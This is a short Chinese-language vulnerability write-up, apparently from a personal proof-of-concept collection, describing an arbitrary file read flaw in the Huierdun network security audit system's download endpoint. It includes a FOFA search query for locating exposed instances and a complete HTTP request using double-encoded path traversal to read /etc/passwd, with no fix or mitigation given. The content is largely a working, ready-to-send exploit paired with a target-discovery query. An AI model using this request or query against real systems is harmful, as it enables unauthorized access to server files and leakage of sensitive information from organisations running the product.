# 惠尔顿安全审计系统download任意文件读取漏洞

# 一、漏洞简介
对于军民融合政策的诸多中小企业来讲，大部分人员主要时间都时在非涉密区工作，并需要用到网络， 所以上网时不小心泄密成了一个可能泄密的高概率事件。 惠尔顿 通过 三员化管理、实名认证上网、网页记录、 邮件审查、文件上传下载、即时通讯、防私接、统计报表 等八大方面确保上网不泄密。惠尔顿网络安全审计系统download接口处存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞获取服务器敏感信息，从而造成信息泄露。

# 二、影响版本
+ 惠尔顿安全审计系统

# 三、资产测绘
+ fofa`app="惠尔顿-网络安全审计系统"`
+ 特征

![1708966359810-2fd7ba60-d5c3-42c3-9dcd-43cffca13a4a.png](./img/Ed_k3Vej_OmbWTmK/1708966359810-2fd7ba60-d5c3-42c3-9dcd-43cffca13a4a-045633.png)

# 四、漏洞复现
```plain
GET /download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1708966387262-824b2693-8e0c-4b28-8490-9108265f6ba3.png](./img/Ed_k3Vej_OmbWTmK/1708966387262-824b2693-8e0c-4b28-8490-9108265f6ba3-592859.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hbrwp07p75ysgyvt>